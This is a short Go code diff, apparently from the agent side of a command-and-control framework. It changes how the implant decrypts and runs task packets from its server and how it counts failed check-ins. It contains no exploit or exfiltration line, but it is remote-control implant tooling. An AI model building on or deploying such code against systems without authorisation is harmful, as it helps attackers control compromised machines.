@@ -111,10 +111,13 @@ func (ma *MainAgent) csharpTaskBackground(data []byte, resultID int) {
 	})
 }
 
-func (ma *MainAgent) processTasking(encData []byte) (packetType uint16, data []byte, resultID int) {
+// processTasking decrypts a tasking blob and runs each task packet in it. It
+// reports false when the blob does not decrypt or parse, so the agent counts
+// that poll as a miss instead of a healthy check-in.
+func (ma *MainAgent) processTasking(encData []byte) bool {
 	tasking, err := common.AesDecryptAndVerify(ma.PacketHandler.Aeskey, encData)
 	if err != nil {
-		return
+		return false
 	}
 
 	offset := 0
@@ -123,7 +126,7 @@ func (ma *MainAgent) processTasking(encData []byte) (packetType uint16, data []b
 	for {
 		packetType, _, _, resultID, length, data, remainingData, err := ma.PacketHandler.ParseTaskPacket(tasking, offset)
 		if err != nil {
-			return 0, nil, 0
+			return false
 		}
 
 		result := ma.ProcessPacket(packetType, data, int(resultID))
@@ -136,7 +139,7 @@ func (ma *MainAgent) processTasking(encData []byte) (packetType uint16, data []b
 			break
 		}
 	}
-	return 0, nil, 0
+	return true
 }
 
 func (ma *MainAgent) ProcessPacket(packetType uint16, data []byte, resultID int) string {
